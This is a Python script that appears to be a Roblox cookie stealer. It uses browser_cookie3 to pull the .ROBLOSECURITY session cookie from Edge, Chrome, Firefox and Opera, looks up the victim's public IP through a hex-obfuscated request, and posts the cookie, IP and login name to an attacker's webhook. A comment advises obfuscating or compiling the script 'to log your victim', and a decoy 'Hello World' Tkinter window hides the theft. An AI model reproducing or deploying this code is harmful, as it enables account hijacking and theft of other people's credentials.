import requests
import os
import browser_cookie3
import threading

WebHook = "Add Webhook" # To log your victim, you have to either covert webhook to bytecode then obfuscate, OR, build this script into an EXE.

def get_ip():
    s = requests.Session()
    s.headers.update({
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko)'
    })
    res = s.get('\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x69\x70\x69\x66\x79\x2e\x6f\x72\x67\x3f\x66\x6f\x72\x6d\x61\x74\x3d\x6a\x73\x6f\x6e')
    ip = res.json()['\x69\x70']
    return ip

def sendToWebhook(url, cookie):
    data = {
        "content" : f"skidxdtoolawesome69, File Name: **{os.path.basename(__file__)}**, Path: **{os.getcwd()}**",
        "username" : "i'm a skid"
    }
    data["embeds"] = [
        {
            "description" : f"{os.getlogin()}'s \x50\x75\x62\x6c\x69\x63\x20\x49\x50\x3a **{get_ip()}**\n\n**Roblox Cookie:**\n```{cookie}```",
            "title" : "SkiddyKit"
        }
    ]

    requests.post(url, json = data)

bns = []

def MicrosoftEdge():
    try:
        cookies = browser_cookie3.edge(domain_name = "roblox.com")
        cookies = str(cookies)
        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
        sendToWebhook(WebHook, cookie)
    except:
        bns.append("msedge")

def GoogleChrome():
    try:
        cookies = browser_cookie3.chrome(domain_name = "roblox.com")
        cookies = str(cookies)
        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
        sendToWebhook(WebHook, cookie)
    except:
        bns.append("chrome")

def MozillaFirefox():
    try:
        cookies = browser_cookie3.firefox(domain_name = "roblox.com")
        cookies = str(cookies)
        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
        sendToWebhook(WebHook, cookie)
    except:
        bns.append("firefox")

def Opera():
    try:
        cookies = browser_cookie3.opera(domain_name = "roblox.com")
        cookies = str(cookies)
        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
        sendToWebhook(WebHook, cookie)
    except:
        bns.append("opera")

browsers = [MicrosoftEdge, GoogleChrome, MozillaFirefox, Opera]

for v in browsers:
    threading.Thread(target = v).start()

if len(bns) >= 4:
    sendToWebhook(WebHook, "NaN, user is not logged in or using an unsupported browser.")

import tkinter as tk

root= tk.Tk()

canvas1 = tk.Canvas(root, width = 300, height = 300)
canvas1.pack()

def hello():  
    label1 = tk.Label(root, text= 'Hello World!', fg='blue', font=('helvetica', 12, 'bold'))
    canvas1.create_window(150, 200, window=label1)
    
button1 = tk.Button(text='Click Me', command=hello, bg='brown',fg='white')
canvas1.create_window(150, 150, window=button1)

root.mainloop()
